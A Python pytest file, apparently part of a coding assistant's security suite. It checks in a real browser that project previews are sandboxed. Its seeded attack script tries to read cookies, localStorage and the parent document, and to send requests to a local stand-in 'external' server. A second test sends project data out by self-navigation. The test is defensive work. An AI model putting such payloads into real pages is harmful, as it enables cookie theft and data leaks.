"""Aislamiento de la vista previa del codificador en un navegador real (Playwright + Edge/Chrome ya instalados; se
salta si no hay). Tres servidores de verdad: la app (127.0.0.1, con cuentas y un modelo falso que llama a
preview_project), el sandbox (127.0.0.2) y un servidor "externo" que cuenta cada petición que recibe.

Un proyecto sembrado intenta, desde la vista previa: leer la cookie, localStorage y parent.document; fetch, Image,
<script src> y form.submit hacia el servidor externo; top.location; window.open; eval. El servidor externo debe recibir
0 peticiones, en el iframe dentro de la app y abriendo la URL de primer nivel en un contexto sin cookies.

Autonavegación (location.href = URL externa): la CSP no la puede impedir (navigate-to no existe en los navegadores) y
el sandbox del iframe tampoco, porque el documento se navega a sí mismo. El test mide lo que hace el navegador y
comprueba que el analizador la marca como bloqueante para publicar. Sin tokens de modelo."""
import http.server
import json
import re
import socket
import threading
import time

import pytest
from langchain_core.messages import AIMessage
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.store.memory import InMemoryStore

from conftest import FakeChat, FakeSearch, _settings

sync_api = pytest.importorskip("playwright.sync_api")
PW = "contraseña-larga-1"

ATTACKS_JS = """
(async () => {
  const EXT = window.EXT, r = {};
  const rec = (k, f) => { try { r[k] = "ok:" + String(f()).slice(0, 120); } catch (e) { r[k] = "blocked:" + e.name; } };
  rec("cookie", () => document.cookie);
  rec("localStorage", () => localStorage.getItem("x"));
  rec("parent_document", () => parent.document.cookie);
  rec("eval", () => eval("1+1"));
  rec("new_function", () => new Function("return 2")());
  rec("window_open", () => window.open(EXT + "/open"));
  rec("image", () => { const i = new Image(); i.src = EXT + "/img.gif"; document.body.appendChild(i); return "created"; });
  rec("script_src", () => { const s = document.createElement("script"); s.src = EXT + "/script.js";
                            document.head.appendChild(s); return "created"; });
  rec("form_submit", () => { const f = document.createElement("form"); f.action = EXT + "/form"; f.method = "POST";
                             const i = document.createElement("input"); i.name = "x"; i.value = "1"; f.appendChild(i);
                             document.body.appendChild(f); f.submit(); return "submitted"; });
  if (window.MODE === "iframe") rec("top_location", () => { top.location = EXT + "/top"; return "assigned"; });
  try { await fetch(EXT + "/fetch"); r.fetch = "ok"; } catch (e) { r.fetch = "blocked:" + e.name; }
  try { await fetch(EXT + "/fetch-no-cors", {mode: "no-cors"}); r.fetch_no_cors = "ok"; }
  catch (e) { r.fetch_no_cors = "blocked:" + e.name; }
  r.origin = String(self.origin);
  r.done = true;
  console.log("RESULTS " + JSON.stringify(r));
  try { parent.postMessage(r, "*"); } catch (e) {}
})();
"""
PAGE = ("<!doctype html><html><head><title>t</title><script>window.EXT = '{ext}'; window.MODE = '{mode}';</script>"
        "<script src=\"js/attacks.js\"></script></head><body><h1>preview</h1></body></html>")


class Recorder(http.server.BaseHTTPRequestHandler):
    hits: list = []

    def _any(self):
        Recorder.hits.append((self.command, self.path))
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>externo</h1>")

    do_GET = do_POST = do_HEAD = _any

    def log_message(self, *a):
        pass


class Guion(FakeChat):
    """Responde lo que el test deje en `next_turn` (una lista de mensajes) cuando empieza cada turno."""
    next_turn: list = []

    def _stream(self, messages, stop=None, run_manager=None, **kwargs):
        if messages[-1].type == "human":
            self.messages = iter(list(self.next_turn))
        yield from super()._stream(messages, stop=stop, run_manager=run_manager, **kwargs)


def _bind(host: str) -> socket.socket:
    sock = socket.socket()
    sock.bind((host, 0))
    return sock


def _serve(app, sock):
    import uvicorn

    server = uvicorn.Server(uvicorn.Config(app, log_level="warning", server_header=False))
    threading.Thread(target=server.run, kwargs={"sockets": [sock]}, daemon=True).start()
    for _ in range(200):
        if server.started:
            return server
        time.sleep(0.05)
    raise RuntimeError("uvicorn no arrancó")


@pytest.fixture(scope="module")
def mundo():
    from assistant.core import tools as core_tools
    from assistant.core.agent import build_agent
    from assistant.core.appdata.memory import MemoryAppData
    from assistant.core.coder import runtime
    from assistant.core.coder.sandbox import create_sandbox_app
    from assistant.core.profile import load_profile
    from assistant.core.server import create_app

    try:
        sbx_sock = _bind("127.0.0.2")
    except OSError as exc:
        pytest.skip(f"no se puede escuchar en 127.0.0.2: {exc}")
    app_sock = _bind("127.0.0.1")
    ext = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Recorder)
    threading.Thread(target=ext.serve_forever, daemon=True).start()
    s = _settings(auth_enabled=True, coder_enabled=True, model_call_limit=0, trusted_hosts=("127.0.0.1",),
                  coder_sandbox_origin=f"http://127.0.0.2:{sbx_sock.getsockname()[1]}")
    coder = load_profile("coder")
    llm = Guion(messages=iter([]))
    agent = build_agent(llm, core_tools.build_tools(llm, s, search_fn=FakeSearch(), profile=coder), s,
                        checkpointer=InMemorySaver(), store=InMemoryStore(), profile=coder)
    appdata = MemoryAppData()
    app = create_app(agent=agent, settings=s, store=InMemoryStore(), appdata=appdata, profile=coder)
    servers = [_serve(app, app_sock), _serve(create_sandbox_app(s, app.state.coder), sbx_sock)]
    yield {"app": f"http://127.0.0.1:{app_sock.getsockname()[1]}", "ext": f"http://127.0.0.1:{ext.server_port}",
           "projects": app.state.coder, "llm": llm, "appdata": appdata}
    for server in servers:
        server.should_exit = True
    ext.shutdown()
    runtime.set_current(None)


@pytest.fixture(scope="module")
def browser():
    with sync_api.sync_playwright() as p:
        b = None
        for kw in ({"channel": "msedge"}, {"channel": "chrome"}, {}):
            try:
                b = p.chromium.launch(headless=True, **kw)
                break
            except Exception:  # noqa: BLE001 - probar el siguiente navegador
                continue
        if b is None:
            pytest.skip("no hay navegador para Playwright")
        yield b
        b.close()


def _login(browser, mundo):
    """Contexto con sesión real en la app (cookie agente0_session) y su CSRF."""
    ctx = browser.new_context()
    r = ctx.request.post(mundo["app"] + "/auth/register", headers={"Origin": mundo["app"]},
                         data={"email": "ana@ejemplo.com", "password": PW, "display_name": "Ana"})
    if not r.ok:  # ya existe (el registro responde un 400 genérico): iniciar sesión
        r = ctx.request.post(mundo["app"] + "/auth/login", headers={"Origin": mundo["app"]},
                             data={"email": "ana@ejemplo.com", "password": PW})
    assert r.ok, r.text()
    csrf = r.json()["csrf"]
    user_id = mundo["appdata"].users.get_by_email("ana@ejemplo.com")["user_id"]
    page = ctx.new_page()
    page.goto(mundo["app"] + "/")
    return ctx, page, csrf, user_id


def _seed(mundo, user_id, mode_files: dict) -> str:
    p = mundo["projects"]
    pid = p.create(user_id, "ataques", "other")["project_id"]
    for path, content in mode_files.items():
        p.write_file(user_id, pid, path, content)
    return pid


def _results_in_iframe(page, url: str) -> dict:
    page.evaluate("""url => { window.__r = null;
        window.addEventListener("message", e => { if (e.data && e.data.done) window.__r = e.data; });
        const f = document.createElement("iframe"); f.setAttribute("sandbox", "allow-scripts");
        f.setAttribute("referrerpolicy", "no-referrer"); f.src = url; document.body.appendChild(f); }""", url)
    page.wait_for_function("() => window.__r !== null", timeout=15000)
    return page.evaluate("() => window.__r")


def test_el_iframe_y_el_primer_nivel_no_salen_a_ningun_sitio(browser, mundo):
    ctx, page, csrf, user_id = _login(browser, mundo)
    cookie = next(c for c in ctx.cookies() if c["name"] == "agente0_session")["value"]
    pid = _seed(mundo, user_id, {
        "index.html": PAGE.format(ext=mundo["ext"], mode="iframe"),
        "top.html": PAGE.format(ext=mundo["ext"], mode="top"),
        "js/attacks.js": ATTACKS_JS,
    })
    # el modelo falso pide la vista previa a través del chat real de la app
    mundo["llm"].next_turn = [AIMessage(content="", tool_calls=[{"name": "preview_project",
                                                                  "args": {"project_id": pid}, "id": "c1"}]),
                              "Listo."]
    sse = page.evaluate("""async ([csrf]) => {
        const h = {"Content-Type": "application/json", "X-CSRF-Token": csrf};
        const t = await (await fetch("/threads", {method: "POST", headers: h})).json();
        const r = await fetch("/chat", {method: "POST", headers: h,
                                        body: JSON.stringify({message: "muéstramelo", thread_id: t.thread_id})});
        return await r.text(); }""", [csrf])
    url = re.search(r"http://127\.0\.0\.2:\d+/p/[A-Za-z0-9_-]+/", sse).group(0)
    Recorder.hits.clear()

    # 1) iframe sandbox dentro de la página de la app, con la sesión de Ana viva
    r = _results_in_iframe(page, url)
    time.sleep(1.5)  # margen para peticiones tardías
    assert r["origin"] == "null"  # origen opaco
    for k in ("cookie", "localStorage", "parent_document"):
        assert r[k].startswith("blocked:SecurityError"), (k, r[k])
    assert r["eval"].startswith("blocked:EvalError") and r["new_function"].startswith("blocked:EvalError")
    assert r["window_open"] == "ok:null"  # sin allow-popups no se abre nada
    assert r["fetch"].startswith("blocked:TypeError") and r["fetch_no_cors"].startswith("blocked:TypeError")
    assert cookie not in json.dumps(r)
    assert page.url.startswith(mundo["app"])  # top.location no navegó la app
    assert Recorder.hits == [], Recorder.hits

    # 2) la misma URL de primer nivel, en un contexto sin cookies (como un visitante)
    anon = browser.new_context()
    assert anon.cookies() == []
    top = anon.new_page()
    logs = []
    top.on("console", lambda m: logs.append(m.text))
    resp = top.goto(url + "top.html")
    assert "set-cookie" not in resp.headers
    top.wait_for_function("() => document.readyState === 'complete'")
    deadline = time.time() + 10
    while not any(t.startswith("RESULTS ") for t in logs) and time.time() < deadline:
        top.wait_for_timeout(100)
    r2 = json.loads(next(t for t in logs if t.startswith("RESULTS "))[len("RESULTS "):])
    time.sleep(1.5)
    assert r2["origin"] == "null"  # la directiva sandbox de la CSP aísla también el primer nivel
    for k in ("cookie", "localStorage"):
        assert r2[k].startswith("blocked:SecurityError"), (k, r2[k])
    assert r2["eval"].startswith("blocked:EvalError") and r2["fetch"].startswith("blocked:TypeError")
    assert r2["window_open"] == "ok:null"
    assert anon.cookies() == []
    assert Recorder.hits == [], Recorder.hits
    anon.close()
    ctx.close()


def test_autonavegacion_lo_que_hace_el_navegador_y_el_analizador(browser, mundo):
    from assistant.core.coder.analyze import analyze, blockers

    ctx, page, csrf, user_id = _login(browser, mundo)
    autonav = ("<!doctype html><html><body><script>location.href = '" + mundo["ext"] +
               "/autonav?d=' + encodeURIComponent('dato-del-proyecto');</script></body></html>")
    pid = _seed(mundo, user_id, {"index.html": autonav})
    # el analizador la marca como bloqueante para publicar
    found = analyze(mundo["projects"].version_texts(pid, 1))
    assert [f["code"] for f in blockers(found)] == ["external_navigation"]
    # vista previa pedida por la ruta del dueño (sesión + CSRF), desde la página de la app
    body = page.evaluate("""async ([pid, csrf]) => (await fetch(`/coder/projects/${pid}/preview`,
        {method: "POST", headers: {"X-CSRF-Token": csrf}})).json()""", [pid, csrf])
    assert body["findings"][0]["code"] == "external_navigation"
    Recorder.hits.clear()

    # iframe: el documento se navega a sí mismo; la app (top) no se mueve
    page.evaluate("""url => { const f = document.createElement("iframe"); f.setAttribute("sandbox", "allow-scripts");
        f.src = url; document.body.appendChild(f); }""", body["url"])
    deadline = time.time() + 10
    while not Recorder.hits and time.time() < deadline:
        time.sleep(0.1)
    iframe_hits = list(Recorder.hits)
    assert page.url.startswith(mundo["app"])

    # primer nivel, sin cookies
    Recorder.hits.clear()
    anon = browser.new_context()
    top = anon.new_page()
    top.goto(body["url"])
    deadline = time.time() + 10
    while not Recorder.hits and time.time() < deadline:
        time.sleep(0.1)
    top_hits = list(Recorder.hits)
    anon.close()
    ctx.close()

    # Comportamiento medido (documentado en docs/CODER_PLAN.md, riesgo R7): el navegador SÍ permite la
    # autonavegación, en el iframe y de primer nivel; lo que sale es solo lo que el propio proyecto pone en la URL
    # (no hay cookies ni datos de la app). Si un navegador futuro la bloquea, este test avisará para actualizar la
    # documentación.
    assert iframe_hits == [("GET", "/autonav?d=dato-del-proyecto")], iframe_hits
    assert top_hits == [("GET", "/autonav?d=dato-del-proyecto")], top_hits
